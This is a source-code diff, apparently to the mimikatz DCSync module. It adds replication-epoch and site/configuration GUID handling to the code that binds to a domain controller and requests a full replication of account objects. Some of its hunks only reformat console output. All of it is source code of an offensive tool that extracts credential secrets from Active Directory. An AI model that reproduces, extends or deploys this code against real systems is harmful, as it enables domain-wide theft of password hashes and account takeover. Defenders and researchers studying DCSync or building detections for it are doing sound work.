@@ -1726,6 +1726,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	ULONG drsStatus;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
 	LPWSTR szTmpDc = NULL;
+	DWORD dwReplEpoch;
+	GUID SiteObjGuid, ConfigObjGUID;
 
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
@@ -1740,19 +1742,22 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 
 		if(szDc)
 		{
-			kprintf(L"[DC] \'%s\' will be the DC server\n\n", szDc);
+			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
 			if(kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 			{
 				if(szGuid)
-					kprintf(L"[DC] Object with GUID \'%s\'\n\n", szGuid);
+					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
 				else
-					kprintf(L"[DC] \'%s\' will be the user account\n\n", szUser);
+					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
 				if(kull_m_rpc_drsr_createBinding(szDc, &hBinding))
 				{
-					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid))
+					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &dwReplEpoch, &SiteObjGuid, &ConfigObjGUID))
 					{
-						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs))
+						if(dwReplEpoch)
+							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", dwReplEpoch);
+						
+						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &dwReplEpoch, &SiteObjGuid, &ConfigObjGUID))
 						{
 							getChReq.V8.pNC = &dsName;
 							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
@@ -1863,7 +1868,7 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 
 void kuhl_m_lsadump_dcsync_descrObject(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
 {
-	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"Object RDN           : ", attributes, ATT_RDN, TRUE);
+	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"\nObject RDN           : ", attributes, ATT_RDN, TRUE);
 	kprintf(L"\n");
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SAM_ACCOUNT_NAME, NULL, NULL))
 		kuhl_m_lsadump_dcsync_descrUser(attributes);
